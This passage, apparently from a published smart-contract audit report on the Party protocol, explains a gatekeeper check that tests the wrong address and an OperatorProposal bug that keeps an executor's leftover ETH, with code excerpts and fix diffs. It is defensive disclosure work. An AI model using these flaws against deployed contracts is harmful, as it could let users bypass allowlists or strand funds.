1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Fortunately the new <code>InitialETHCrowdfund</code> and <code>ReraiseETHCrowdfund</code> contracts are very similar to the already audited other crowdfund contracts.</p>\n<p>So we can look into the <code>Crowdfund.sol</code> code and see how the <code>gatekeeper.isAllowed</code> function should be called:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/Crowdfund.sol#L620-L644\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_contribute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousTotalContributions</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gateData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidContributorError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Must not be blocked by gatekeeper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">IGateKeeper</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gateKeeper</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">IGateKeeper</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gateKeeperId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gateData</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAllowedByGateKeeperError</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">gateKeeperId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">gateData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p>We can see that the first argument to the <code>gatekeeper.isAllowed</code> function is <code>msg.sender</code>.</p>\n<p>This means that when User A contributes for User B, the address that is checked is the address of User A and not the address of User B.</p>\n<p>The new crowdfund contracts however check <code>contributor</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L282-L293\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Must not be blocked by gatekeeper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">IGateKeeper</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gateKeeper</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">IGateKeeper</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gateKeeperId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gateData</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAllowedByGateKeeperError</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_gateKeeper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">gateKeeperId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">gateData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This means that when User A contributes for User B, the address of User B is checked. However it should be the address of User A (as seen above).</p>\n<p>Imagine a situation where three addresses are whitelisted by the gatekeeper:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Alice</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Bob</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Chris</span></span></code></pre>\n<p>What should be checked by the gatekeeper is that only Alice, Bob and Chris can make contributions but they should be able to make contributions for everyone (check <code>msg.sender</code> instead of contributor).</p>\n<p>What is actually checked is that any user can make a contribution but they can only contribute to Alice, Bob and Chris (check contributor instead of <code>msg.sender</code>).</p>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In both contracts the <code>msg.sender</code> needs to be checked instead of <code>contributor</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 8ab3b5c..fa8ec5d 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -282,9 +282,9 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Must not be blocked by gatekeeper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IGateKeeper _gateKeeper = gateKeeper;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (_gateKeeper != IGateKeeper(address(0))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 revert NotAllowedByGateKeeperError(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    contributor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     _gateKeeper,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     gateKeeperId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     gateData</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 580623d..72f3a20 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -215,9 +215,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Must not be blocked by gatekeeper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IGateKeeper _gateKeeper = gateKeeper;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (_gateKeeper != IGateKeeper(address(0))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (!_gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 revert NotAllowedByGateKeeperError(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    contributor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     _gateKeeper,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     gateKeeperId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     gateData</span></span></span></code></pre>\n<p>On this note it is important to mention that there is also an issue in <code>Crowdfund.sol</code> which is out of scope but the issue is of importance here:</p>\n<p>The issue is in the <code>Crowdfund.batchContributeFor</code> function.</p>\n<p>The function calls <code>this.contributeFor</code> <a href=\"https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/crowdfund/Crowdfund.sol#L365-L368\">Link</a>.</p>\n<p>So when the call is made, <code>msg.sender</code> is the address of the crowdfund and not the address of the user.</p>\n<p>Therefore the gatekeeper check is wrong <a href=\"https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/crowdfund/Crowdfund.sol#L596\">Link</a>.</p>\n<p>This is clearly not how the gatekeeper should be used. The gatekeeper should check the address of the user.</p>\n<p>If you implement in the <code>ReraiseETHCrowdfund</code> and <code>InitialETHCrowdfund</code> contracts the changes I suggested, the same issue will be introduced there.</p>\n<p>The solution is to call <code>_contributeFor</code> directly and to remove the <code>revertOnFailure</code> option. Or do a more involved change with supplying the correct <code>msg.sender</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/6#issuecomment-1509386073\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Will leave open for sponsor review. </p>\n<p>I think the crux of it comes down to this assumption by the warden:</p>\n<blockquote>\n<p>“This is clearly not how the gatekeeper should be used. The gatekeeper should check the address of the user.”</p>\n</blockquote>\n<p>I believe the design is meant to check instead for the address of the <code>contributor</code> but cannot find that explicitly documented. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/6#issuecomment-1512009109\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I think it makes the most sense to be consistent with the behavior of prior crowdfunds here. Will implement the recommended mitigation.</p>\n<p>The note about <code>Crowdfund.batchContributeFor</code> is also interesting and something we’ll look into. Very glad it was brought up even though it was out of scope.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-operatorproposalsol-leftover-eth-is-not-refunded-to-the-msgsender\" style=\"position:relative;\"><a href=\"#m-10-operatorproposalsol-leftover-eth-is-not-refunded-to-the-msgsender\" aria-label=\"m 10 operatorproposalsol leftover eth is not refunded to the msgsender permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/5\">[M-10] <code>OperatorProposal.sol</code>: Leftover ETH is not refunded to the <code>msg.sender</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/5\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/30\">hansfriese</a></em></p>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L7-L63\"><code>OperatorProposal</code></a> contract is a type of proposal that allows to execute operations on contracts that implement the <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/operators/IOperator.sol\"><code>IOperator</code></a> interface.</p>\n<p>Upon execution of the proposal it might be necessary that the <code>executor</code> provides ETH.</p>\n<p>This is true especially when <code>allowOperatorsToSpendPartyEth=false</code>, i.e. when ETH cannot be spent from the Party’s balance. So it must be provided by the <code>executor</code>.</p>\n<p>The amount of ETH that is needed to execute the operation is sent to the operator contract:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L45\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">execute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operatorValue</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operatorData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">executionData</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operator contract then spends whatever amount of ETH is actually necessary and returns the remaining ETH.</p>\n<p>For example the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224\"><code>CollectionBatchBuyOperator</code></a> contract may not spend all of the ETH because the actual purchases that are made are not necessarily known at the time the proposal is created. Also not all purchases may succeed.</p>\n<p>So it is clear that some of the ETH may be returned from the <code>operator</code> to the <code>OperatorProposal</code> contract.</p>\n<p>The issue is that the remaining ETH is not refunded to the <code>executor</code> and therefore this results in a direct loss of funds for the <code>executor</code>.</p>\n<p>I discussed this issue with the sponsor and it is clear that the remaining ETH needs to be refunded when <code>allowOperatorsToSpendPartyEth=false</code>.</p>\n<p>However it is not clear what to do when <code>allowOperatorsToSpendPartyEth=true</code>. In this case ETH can be spent from the party’s balance. So there should be limited use cases for the <code>executor</code> providing additional ETH.</p>\n<p>But if the <code>executor</code> provides additional ETH what should happen?</p>\n<p>Should the ETH be taken from the <code>executor</code> first? Or should it be taken from the Party balance first?</p>\n<p>The sponsor mentioned that since there are limited use cases for the <code>executor</code> providing additional ETH it may be ok to not refund ETH at all.</p>\n<p>I disagree with this. Even when <code>allowOperatorsToSpendPartyEth=true</code> there should be a policy for refunds. I.e. the necessary ETH should either be taken from the Party’s balance or from the <code>executor</code> first and any remaining funds from the <code>executor</code> should be returned.</p>\n<p>However since it is not clear how to proceed in this case and since it is less important compared to the case where <code>allowOperatorsToSpendPartyEth=false</code> I will only make a suggestion for the case where <code>allowOperatorsToSpendPartyEth=false</code>.</p>\n<p>The sponsor should decide what to do in the other case and make the appropriate changes.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When the <code>executor</code> executes an <code>OperatorProposal</code>, <code>operatorValue</code> amount of ETH is sent to the <code>operator</code> contract (when <code>allowOperatorsToSpendPartyEth=false</code> all of these funds must come from the <code>msg.value</code>):</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L40-L45\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">allowOperatorsToSpendPartyEth</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operatorValue</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotEnoughEthError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operatorValue</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Execute the operation.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">execute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operatorValue</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operatorData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">executionData</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Currently the only <code>operator</code> contract that is implemented is the <code>CollectionBatchBuyOperator</code> and as explained above not all of the funds may be used so the funds are sent back to the Party:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L191-L192\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">unusedEth</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalEthUsed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">unusedEth</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">unusedEth</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However after calling the <code>operator</code> contract, the <code>OperatorProposal</code> contract just returns without sending back the unused funds to the <code>executor</code> (<code>msg.sender</code>).</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L47-L48\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Nothing left to do.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>So there is a loss of funds for the <code>executor</code>. The leftover funds are effectively transferred to the Party.</p>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 